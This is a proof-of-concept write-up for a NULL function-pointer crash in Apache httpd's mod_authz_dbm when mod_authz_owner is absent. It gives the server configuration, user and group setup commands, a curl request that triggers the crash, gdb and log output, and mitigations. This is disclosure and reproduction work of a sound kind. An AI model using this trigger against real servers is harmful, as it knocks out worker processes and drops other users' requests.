# PoC 083 - mod_authz_dbm Unchecked Optional Function Pointer

`dbmfilegroup_check_authorization()` calls
`authz_owner_get_file_group(r)` without checking that the optional function
was actually provided. With `mod_authz_owner` absent, the pointer is `NULL`
and the worker crashes during authorization.

## Setup

`/etc/apache2/httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule auth_basic_module modules/mod_auth_basic.so
LoadModule authz_dbm_module modules/mod_authz_dbm.so
# Intentionally NOT loaded:
# LoadModule authz_owner_module modules/mod_authz_owner.so

ErrorLog logs/error_log

DocumentRoot "/srv/www"
<Directory "/srv/www/protected">
    AuthType Basic
    AuthName "dbm-file-group test"
    AuthBasicProvider file
    AuthUserFile  "/etc/apache2/users.htpasswd"
    AuthDBMGroupFile "/etc/apache2/groups.dbm"
    Require dbm-file-group
</Directory>
```

Create the user and a DBM group file with that user as a member, so the lookup
succeeds and execution reaches the optional-function call:

```bash
htpasswd -bc /etc/apache2/users.htpasswd alice s3cret
# httxt2dbm or dbmmanage builds the group file; provider must match build.
printf 'alice: webgroup\n' > /tmp/groups.txt
httxt2dbm -i /tmp/groups.txt -o /etc/apache2/groups.dbm
mkdir -p /srv/www/protected
echo ok > /srv/www/protected/index.html
```

## Trigger

Run httpd in single-process mode to make the crash unmistakable:

```bash
./httpd -X -f /etc/apache2/httpd.conf
```

In another terminal:

```bash
curl -i -u alice:s3cret http://127.0.0.1:8080/protected/
```

## Observed effect

httpd terminates immediately:

```text
$ ./httpd -X -f /etc/apache2/httpd.conf
Segmentation fault (core dumped)
```

Under gdb:

```bash
gdb --args ./httpd -X -f /etc/apache2/httpd.conf
(gdb) run
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) bt 3
#0  0x0000000000000000 in ?? ()
#1  dbmfilegroup_check_authorization (r=0x..., require_args=..., parsed_require_args=...)
    at modules/aaa/mod_authz_dbm.c:247
#2  ap_run_auth_checker (...)
```

The instruction pointer is `NULL` because `authz_owner_get_file_group` was
never assigned; `APR_RETRIEVE_OPTIONAL_FN` returned `NULL` when
`mod_authz_owner` was unavailable.

## Log marker

`error_log`:

```text
[core:notice] AH00052: child pid <pid> exit signal Segmentation fault (11)
```

Under prefork the parent forks a fresh worker for each request, so each
authenticated request crashes one worker. With event/worker MPMs the same
crash kills the multi-threaded worker, dropping all in-flight requests.

## Notes

- The crash requires reaching the file-group comparison path, which means a
  successful DBM lookup. `Require dbm-file-group` against an empty group file
  short-circuits earlier and does not crash.
- Mitigation: load `mod_authz_owner`, or apply the `if (!authz_owner_get_file_group)`
  guard from the patch.
